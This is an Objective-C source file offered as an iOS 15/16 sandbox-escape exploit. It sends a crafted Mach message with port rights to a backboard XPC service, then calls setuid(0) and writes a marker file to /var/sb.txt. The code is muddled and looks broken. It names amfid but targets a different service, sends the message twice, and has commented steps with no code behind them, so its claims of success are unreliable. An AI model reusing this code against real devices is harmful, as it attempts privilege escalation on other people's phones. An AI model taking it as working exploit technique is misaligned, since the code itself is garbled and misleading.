//
//  amfid_xpc.m
//  im_not_amfid
//
//  Created by Ali on 27.03.2023.
//

#import <Foundation/Foundation.h>
#import "ViewController.h"
#import <mach/port.h>
#import <mach/mach.h>
#include <dirent.h>
#include <string.h>
#include <mach/message.h>

/*
  This only supports 15.0/16.2
  This is for educational purposes use it at your OWN RISK!
  Exploit and boom boom stuff by aliy_2001
 */

kern_return_t
bootstrap_look_up(mach_port_t bp, const char* service_name, mach_port_t *sp);

struct xpc_j337 {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t client_port;
  mach_msg_port_descriptor_t reply_port;
};


kern_return_t getAmfid() {
    // We will need an XPC service to try getting the amfid pid and build a ripped amfid service
    const char* amfid_xpc = "com.apple.backboard.TouchDeliveryPolicyServer";

    printf("We will be triggering some special sausage to make them drop the amfid???\n");

    // Declare and initialize mach_port_t variables
    mach_port_t amfid_port = MACH_PORT_NULL;
    mach_port_t client_port = MACH_PORT_NULL;
    mach_port_t reply_port = MACH_PORT_NULL;

    kern_return_t amfidRet = bootstrap_look_up(bootstrap_port, amfid_xpc, &amfid_port);
    if (amfidRet == KERN_SUCCESS) {
        printf("amfid_bootstrap_port: 0x%u\n", amfid_port);
    }
    
    // Allocate a receive right for the client port
    amfidRet = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &client_port);
    if (amfidRet == KERN_SUCCESS) {
        printf("client_port: 0x%x\n", client_port);
    }
  
    // Allocate a receive right for the amfid port
    

    // Insert send right to the client port
    amfidRet = mach_port_insert_right(mach_task_self(), client_port, client_port, MACH_MSG_TYPE_MAKE_SEND);
    if (amfidRet == KERN_SUCCESS) {
    }
  
    amfidRet = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (amfidRet != KERN_SUCCESS) {
        printf("port allocation failed: %s\n", mach_error_string(amfidRet));
    } else {
        printf("reply_port: 0x%x\n", reply_port);
    }

    // Allocate a send right for the reply port
    amfidRet = mach_port_insert_right(mach_task_self(), reply_port, reply_port, MACH_MSG_TYPE_MAKE_SEND);
    if (amfidRet != KERN_SUCCESS) {
        printf("port insert failed: %s\n", mach_error_string(amfidRet));
    }
    mach_port_t so = MACH_PORT_NULL;
      mach_msg_type_name_t type = 0;
      kern_return_t err = mach_port_extract_right(mach_task_self(), client_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &so, &type);
      if (err != KERN_SUCCESS) {
        printf("port right extraction failed: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
      }
      printf("made so: 0x%x from recv: 0x%x\n", so, client_port);
    struct xpc_j337 msg;
      memset(&msg.hdr, 0, sizeof(msg));
      msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
      msg.hdr.msgh_size = sizeof(msg);
      msg.hdr.msgh_remote_port = amfid_port;
      msg.hdr.msgh_id   = 'j337';

      msg.body.msgh_descriptor_count = 2;

      msg.client_port.name        = client_port;
      msg.client_port.disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
      msg.client_port.type        = MACH_MSG_PORT_DESCRIPTOR;

      msg.reply_port.name        = reply_port;
      msg.reply_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
      msg.reply_port.type        = MACH_MSG_PORT_DESCRIPTOR;

    kern_return_t sendret= mach_msg(&msg.hdr,
                     MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                     msg.hdr.msgh_size,
                     0,
                     MACH_PORT_NULL,
                     MACH_MSG_TIMEOUT_NONE,
                     MACH_PORT_NULL);
   
    kern_return_t killsb= mach_msg(&msg.hdr,
                     MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                     msg.hdr.msgh_size,
                     0,
                     MACH_PORT_NULL,
                     MACH_MSG_TIMEOUT_NONE,
                     MACH_PORT_NULL);
    msg.hdr.msgh_id   = 'w00t';
    // Send the message to amfid_port
 
    if (sendret == KERN_SUCCESS) {
        printf("Message sent successfully\n");
        setgid(0);
        setuid(0);
        // Get the amfid PID from the reply message
        
            // Print the amfid PID
       

        // Print the amfid PID
        
        // Create a file at /var/sb.txt with write permissions for everyone
        FILE *f = fopen("/var/sb.txt", "w");
        if (f == NULL) {
            printf("Error opening file!\n");
            return 1;
        }

        // Write the message to the file
        char *msg = "hello sb was here";
        int ret = fputs(msg, f);
        if (ret == EOF) {
            printf("Error writing to file!\n");
            return 1;
        }
        amfid_xpc="com.apple.backboard.TouchDeliveryPolicyServer";
        // finally kill backboardd
        if (killsb == KERN_SUCCESS) {}
        
        
        sleep(2);
        
        // Close the file
        fclose(f);

        mach_port_deallocate(mach_task_self(), so);
    } else {
        printf("Error sending message: %s\n", mach_error_string(sendret));
    }

    // Wait for the reply on the reply_port
   

    // Clean up the reply message
   


  
    
    


    return 0;
}

